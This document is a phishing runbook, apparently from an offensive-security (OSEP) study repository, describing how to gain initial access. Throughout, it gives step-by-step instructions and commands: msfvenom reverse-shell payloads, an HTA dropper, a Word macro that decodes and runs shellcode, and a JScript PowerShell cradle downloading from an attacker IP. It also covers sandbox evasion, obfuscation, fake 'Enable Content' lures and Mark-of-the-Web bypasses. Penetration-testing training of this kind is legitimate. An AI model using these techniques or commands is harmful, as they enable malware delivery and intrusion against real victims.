# Phishing Runbook

> The initial access chapter. Choose your vector based on what you can deliver to the target.

---

## Delivery Vector Decision Tree

```
What do you know about the target environment?
│
├── You have a URL you can send (web link)
│   ├── Internet Explorer / Edge legacy available?
│   │   └── → hta/clickme.hta (JScript ActiveX approach)
│   └── Modern browser only?
│       └── → Consider HTML smuggling or calendar phishing
│
├── You can send an email attachment
│   ├── Office installed (Word, Excel)?
│   │   └── → office-macros/XorShellcodeRunner.vba (embed in .docm)
│   └── No Office?
│       └── → jscript/dropper.js (runs via wscript.exe)
│
├── You have write access to a web server already
│   └── → Drop 03-loaders/webshells/ASPX_Inject64.aspx
│
└── OSEP Calendar Phishing
    └── → See OSEP/3. Phishing with Calendars.md
```

---

## HTA Files (`hta/`)

**What is HTA?** HTML Application — a file with `.hta` extension that runs as a "trusted" application using `mshta.exe`. Has access to ActiveX and WScript objects that normal web pages don't.

### clickme.hta — The Basic HTA Dropper

**What it does:**
1. Uses `WScript.Shell.Run()` to execute PowerShell
2. Downloads your binary payload from Kali with `iwr` or `wget`
3. Saves to `C:\Users\Public\runner.exe` and executes it

**Setup steps:**
1. Generate payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f exe -o runner.exe`
2. Host it: `python3 -m http.server 80`
3. Edit `clickme.hta` — change `172.21.23.10` to your IP
4. Host the HTA file too: put it in the same web server directory
5. Send the URL to target: `http://<IP>/clickme.hta`
6. Start Metasploit listener

**When victim opens it:**
- `mshta.exe` runs the HTA (no UAC prompt)
- JScript executes silently
- Downloads and runs your payload

**Limitations:**
- Requires older IE/Edge or mshta invocation
- Modern Edge won't auto-download/run
- The `shell.Run()` will show a CMD window briefly
- Defender may catch `runner.exe` on disk

**Better approach when Defender is active:**
- Use `nonDN2J.hta` which inlines shellcode rather than dropping disk files
- Or chain with an encrypted loader from `03-loaders/shellcode-runners/clrunner.cs`

---

## Office Macros (`office-macros/`)

### XorShellcodeRunner.vba — Word Macro with XOR Shellcode

**What it does:**
- Runs on `Document_Open()` and `AutoOpen()` (when victim opens .docm)
- Uses `FlsAlloc()` as a sandbox check (returns null in some sandboxes)
- Decodes XOR-encoded shellcode (key = 250/0xfa) and executes it

**Setup steps:**
1. Generate shellcode: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f csharp`
2. XOR encode it with key 0xfa using `04-encoders/xor/xor_encoder.py`
3. Format output as a VBA array (byte per element)
4. Paste into the `buf = Array(...)` section
5. Open Word → Tools → Macros → Visual Basic Editor → paste macro
6. Save as .docm (not .docx — .docx can't run macros)
7. Start listener

**Sandbox evasion:**
- `FlsAlloc(0)`: Fiber Local Storage - returns null in some emulated environments
- Sleep + time check: not included in VBA version but add if needed

**How to embed in Word:**
```
1. Open Word
2. Alt+F8 → View Macros
3. Create new macro "MyMacro"
4. Paste code
5. File → Save As → Word Macro-Enabled Document (.docm)
```

### WordPsCradle.vbs — Obfuscated PS Download Cradle in VBA

**What it does:**
- Uses a char-rotation cipher (`Yellow()` function) to obfuscate strings
- Decodes strings at runtime to call WMI `Win32_Process.Create()`
- Downloads and runs your PS payload via WMI (harder to detect than Shell.Run)

**The obfuscation:**
- `Grass()`: subtracts 12 from char codes (rotation cipher)
- `Yellow()`: decodes the full obfuscated string
- Encoded strings are built by adding 12 to each char's ordinal value

**WMI execution:**
```vb
GetObject("winmgmts:").Get("Win32_Process").Create <command>
```
This creates a process via WMI, which can bypass some monitoring tools
that hook `Shell.Run()` but miss WMI process creation.

---

## JScript (`jscript/`)

### dropper.js — JScript Dropper

**When to use:**
- Target can execute .js files (via double-click or wscript.exe)
- Email with .js attachment

**Basic JScript dropper pattern:**
```javascript
var shell = new ActiveXObject("WScript.Shell");
// Run PowerShell download cradle
shell.Run("powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://<IP>/payload.ps1')\"");
```

**DotNetToJScript approach (DN2J):**
- Converts .NET assemblies to JScript that instantiates them via COM
- Bypasses some AV that doesn't understand the COM-to-.NET bridge
- See `loaders/phishing/osep-phishing-samples/` for examples

---

## Phishing Tips

### Making the Document Convincing
- Name it something relevant: `Q4_Financial_Report.docm`, `Invoice_2024.docm`
- Enable the macro prompt on open with a fake "Enable Content" message
- Add a blurred background image that says "Document protected — click Enable Content"

### Delivery Methods
- Email with attachment (filter evasion: zip the .docm with password)
- SharePoint/OneDrive link (social engineering)
- USB drop (physical)
- Watering hole (compromise a site the target visits)
- Calendar invitation (OSEP specific — `.ics` files with malicious links)

### OSEP Calendar Phishing
See `OSEP/3. Phishing with Calendars.md` for the full walkthrough.
Key points:
- Create `.ics` calendar invitation
- Embed a malicious URL in the location/description field
- When victim accepts, clicking the location opens the URL in browser → HTA or mshta

### Bypassing Mark-of-the-Web (MOTW)
Files downloaded from the internet get a MOTW tag that triggers Smart Screen.
Bypass options:
- Zip with password (user extracts → no MOTW on extracted file)
- ISO file (mounted ISO doesn't propagate MOTW to contents in older Windows)
- `.lnk` files (shortcut files have different MOTW handling)
